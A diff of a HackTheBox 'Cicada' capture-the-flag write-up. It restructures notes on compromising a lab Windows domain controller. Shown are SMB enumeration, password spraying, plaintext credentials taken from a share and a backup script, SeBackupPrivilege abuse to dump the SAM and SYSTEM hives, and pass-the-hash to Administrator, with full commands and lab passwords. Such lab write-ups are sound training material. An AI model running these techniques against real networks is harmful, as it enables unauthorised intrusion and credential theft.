@@ -9,17 +9,38 @@ services: ['ncacn_http', 'kerberos-sec', 'kpasswd5', 'http', 'ldap', 'microsoft-
 techniques_used: []
 tools_used: [nmap]
 ---
-
 # Cicada
 
 **Platform:** HTB | **Difficulty:** Easy | **OS:** Windows | **Date:** 15/06/2025
 
-## Overview 
+## Overview
 
+Complete domain compromise through default password discovery and SeBackupPrivilege abuse for registry extraction.
+
+```mermaid
+flowchart TD
+    A[SMB Share Enumeration] --> B[Default Password Discovery]
+    B --> C[Password Spraying]
+    C --> D[Credential Discovery<br/>Multiple Users]
+    D --> E[Initial Access<br/>emily.oscars]
+    E --> F[SeBackupPrivilege<br/>Registry Extraction]
+    F --> G[SAM Hash Extraction]
+    G --> H[Pass-the-Hash<br/>Administrator]
+    
+    classDef recon fill:#e3f2fd,stroke:#1976d2
+    classDef exploit fill:#e8f5e8,stroke:#2e7d32
+    classDef privesc fill:#fff3e0,stroke:#f57c00
+    classDef goal fill:#ffebee,stroke:#c62828
+    
+    class A,B recon
+    class C,D,E exploit
+    class F,G privesc
+    class H goal
+```
 
 ---
 
-## Phase 1: Reconnaissance 
+## Phase 1: Reconnaissance
 
 ### Network Discovery
 
@@ -41,6 +62,7 @@ nmap -sC -sV -T4 10.10.11.35 -oA nmap/cicada
 | 3268 | ldap | Microsoft Windows Active Directory LDAP |
 | 3269 | ldap | Microsoft Windows Active Directory LDAP |
 | 5985 | http | Microsoft HTTPAPI httpd 2.0 |
+Standard domain controller port profile indicated Active Directory environment with SMB shares and WinRM available.
 
 ### DNS Configuration
 
@@ -54,7 +76,7 @@ nxc smb '10.10.11.35' --generate-hosts-file files/hosts && sudo tee -a /etc/host
 
 ### Share Enumeration
 
-Found a HR share 
+Guest access enumeration revealed accessible HR share containing organizational information:
 ```bash
 nxc smb 'CICADA-DC' -u 'wither' -p '' -d 'cicada.htb' --shares
 
@@ -72,7 +94,9 @@ SMB         10.10.11.35     445    CICADA-DC        NETLOGON                    
 SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
 ```
 
-Text file in the HR share
+### Default Password Discovery
+
+HR share contained organizational notice with default password for new employees:
 ```bash
 smbclient -U 'guest' -p ''  \\\\10.10.11.35\\HR
 
@@ -84,12 +108,9 @@ smb: \> dir
   Notice from HR.txt                  A     1266  Wed Aug 28 18:31:48 2024
 
                 4168447 blocks of size 4096. 481599 blocks available
-smb: \> get 'Notice from HR.txt'
-NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \'Notice
 smb: \> get "Notice from HR.txt"
 getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (16.5 KiloBytes/sec) (average 16.5 KiloBytes/sec)
 smb: \> exit
-
 ```
 
 Default password found in the note.
@@ -101,75 +122,30 @@ Your default password is: Cicada$M6Corpb*@Lp#nZp!8
 ...
 ```
 
-Save the password to a file
+Saved the password to a file:
 ```bash
 echo 'Cicada$M6Corpb*@Lp#nZp!8' > creds.txt
 ```
 
 ### User Enumeration
 
-Enumerate users via RID cycling
+RID cycling enumeration built target user list for password spraying:
 ```bash
 nxc smb 'CICADA-DC' -u 'guest' -p '' --rid-brute | awk '{print $6}' | cut -d '\' -f2 > potential-users.txt
 ```
 
-Sprayed the password I found earlier against the list of users to find a match against `michael.wrightson` as well as a password `aRt$Lp#7t*VQ!3` for `david.orelious` in his description.
+---
+
+## Phase 2: Exploitation - Password Spraying & Credential Discovery
+
+### Password Spraying Attack
+
+Password spraying the discovered default password against enumerated users revealed multiple valid accounts, including additional credentials in user descriptions:
 ```bash
 nxc ldap 'CICADA-DC' -u potential-users.txt -p creds.txt --active-users 
 
-LDAP        10.10.11.35     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never) 
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Windows:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\guest::Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Cert:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Schema:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Group:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Read-only:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Cloneable:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Protected:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Key:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\RAS:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Allowed:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Denied:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\DnsAdmins:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\DnsUpdateProxy:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target?
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Groups:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
-Error: [Errno 104] Connection reset by peer
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 
-LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 
+...
+cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 
 LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
 LDAP        10.10.11.35     389    CICADA-DC        [*] Total records returned: 8, total 1 user(s) disabled
 LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
@@ -182,7 +158,9 @@ LDAP        10.10.11.35     389    CICADA-DC        david.orelious              
 LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 22:20:17 2  
 ```
 
-Use `michael`'s credentials to get a more accurate list of users.
+### Complete User Enumeration
+
+Used valid credentials to obtain complete user listing:
 ```bash
 nxc ldap 'CICADA-DC' -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --active-users | awk '{print $5}' | grep -v '[\[*|-]' > users.txt
 
@@ -195,45 +173,11 @@ david.orelious
 emily.oscars
 ```
 
-Spider the files on the SMB server and download them.
+### Share Spidering
+
+SMB share spidering with `david.orelious` credentials revealed additional resources:
 ```bash
-xc smb 'CICADA-DC' -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -M spider_plus -o DOWNLOAD_FLAG=True 
-
-
-/home/wither/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
-  from pkg_resources import resource_filename
-SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
-SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] Started module spidering_plus with the following options:
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]  DOWNLOAD_FLAG: True
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]     STATS_FLAG: True
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]  MAX_FILE_SIZE: 50 KB
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]  OUTPUT_FOLDER: /home/wither/.nxc/modules/nxc_spider_plus
-SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
-SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
-SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
-SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
-SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
-SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
-SMB         10.10.11.35     445    CICADA-DC        HR              READ            
-SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
-SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
-SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [+] Saved share-file metadata to "/home/wither/.nxc/modules/nxc_spider_plus/10.10.11.35.json".
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] SMB Shares:           7 (ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL)
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] SMB Readable Shares:  5 (DEV, HR, IPC$, NETLOGON, SYSVOL)
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] SMB Filtered Shares:  1
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] Total folders found:  33
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] Total files found:    12
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] File size average:    1.09 KB
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] File size min:        23 B
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] File size max:        5.22 KB
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] File unique exts:     6 (ini, inf, cmtx, pol, ps1, txt)
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] Unmodified files:     12
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] All files were not changed.
-SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [+] All files processed successfully.
+nxc smb 'CICADA-DC' -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -M spider_plus -o DOWNLOAD_FLAG=True 
 ```
 
 Copy the files from the newly discovered DEV share.
@@ -241,7 +185,9 @@ Copy the files from the newly discovered DEV share.
 cp -r /home/wither/.nxc/modules/nxc_spider_plus/10.10.11.35/DEV/* .
 ```
 
-It's a backup script that reveals `emily.oscars`'s password `Q!3@Lp#M6b*7t*Vt`.
+### Credential Discovery
+
+Backup script contained hardcoded credentials for `emily.oscars`:
 ```bash
 cat Backup_script.ps1                                              
 
@@ -258,40 +204,27 @@ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
 
-She can login via winrm
+### Initial Access
+
+WinRM access validated with `emily.oscars` credentials:
 ```bash
 nxc winrm 'CICADA-DC' -u users.txt  -p creds.txt  -d 'cicada.local'                 
-WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) 
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Administrator:Cicada$M6Corpb*@Lp#nZp!8
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Guest:Cicada$M6Corpb*@Lp#nZp!8
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\david.orelious:Cicada$M6Corpb*@Lp#nZp!8
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Administrator:aRt$Lp#7t*VQ!3
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Guest:aRt$Lp#7t*VQ!3
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\john.smoulder:aRt$Lp#7t*VQ!3
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\sarah.dantelia:aRt$Lp#7t*VQ!3
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\michael.wrightson:aRt$Lp#7t*VQ!3
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\david.orelious:aRt$Lp#7t*VQ!3
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\emily.oscars:aRt$Lp#7t*VQ!3
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Administrator:Q!3@Lp#M6b*7t*Vt
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Guest:Q!3@Lp#M6b*7t*Vt
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\john.smoulder:Q!3@Lp#M6b*7t*Vt
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\sarah.dantelia:Q!3@Lp#M6b*7t*Vt
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\michael.wrightson:Q!3@Lp#M6b*7t*Vt
-WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\david.orelious:Q!3@Lp#M6b*7t*Vt
+...
 WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.local\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
 ```
-
 
 User flag was on her Desktop
 ```powershell
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> more ../Desktop/user.txt
 ```
 
-She has `SeBackupPrivilege`
+---
+
+## Phase 3: Privilege Escalation - SeBackupPrivilege
+
+### Privilege Analysis
+
+`emily.oscars` account possessed `SeBackupPrivilege`, which enabled registry hive extraction:
 ```powershell
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
 
@@ -307,7 +240,9 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-Save reg SAM and SYSTEM hives and download them
+### Registry Hive Extraction
+
+`SeBackupPrivilege` allowed reading any file on the system, including protected registry hives containing password hashes:
 ```powershell
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam sam
 The operation completed successfully.
@@ -327,8 +262,9 @@ Info: Downloading C:\Users\emily.oscars.CICADA\Documents\system to system
 Info: Download successful!
 ```
 
+### Hash Extraction
 
-Extract the SAM hive secrets with `pypykatz`.
+Registry hive analysis revealed Administrator NTLM hash:
 ```bash
 pypykatz registry --sam sam system
 
@@ -350,20 +286,21 @@ Root flag in Administrator desktop
 *Evil-WinRM* PS C:\Users\Administrator\Documents> more ../Desktop/root.txt
 ```
 
-## Enumeration
-
-
-
 ---
 
-## Phase 2: Exploitation
+## Conclusion
 
+Complete domain compromise achieved through poor password management practices and dangerous privilege assignments rather than software vulnerabilities.
+
+**Critical Misconfigurations Exploited:**
+- Default passwords exposed in accessible file shares
+- Plaintext credentials stored in backup scripts
+- SeBackupPrivilege assigned to standard user account
+- Weak password policies allowing credential reuse
+
+**Key Technical Takeaway:** User accounts with backup privileges can extract registry hives containing password hashes, providing a direct path to domain administrator access without requiring exploitation of traditional privilege escalation vectors.
 
 ---
-
-## Phase 3: Privilege Escalation
-
-
 
 ## References
 - [Enumerate Users by Bruteforcing RID \| NetExec](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid)
